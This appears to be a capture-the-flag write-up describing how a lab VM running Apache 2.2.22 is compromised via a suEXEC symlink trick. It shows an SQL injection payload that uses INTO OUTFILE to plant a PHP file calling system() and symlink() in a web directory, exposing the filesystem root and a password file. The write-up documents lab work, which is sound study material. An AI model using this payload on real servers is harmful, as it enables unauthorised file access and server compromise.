### Writeup 3
>suEXEC privilege elevation 

When we scanned the machine with nikto we saw that the machine is using `Server: Apache/2.2.22 (Ubuntu)`

So we searched for exploits for this version of apache and found this exploit: https://www.exploit-db.com/exploits/27397


We will have to do an SQL injection to get acces to the machine with this exploit





```php
SELECT '<?php  system("ln -sf / test99.php"); symlink("/", "test99.php"); ?>' into outfile '/var/www/forum/templates_c/suexec.php'  
```

We have to go to https://192.168.56.101/forum/templates_c/suexec.php and we now have a folder called test99.php redirecting to the racine folder

![](https://zekao.s-ul.eu/WqYeJeyw.png)

We can now access to /home/LOOKATME/password.txt 



Now, we can go to [the writeup 1](../writeup1.md) on the ftp part to coninue the challenge and get the flag
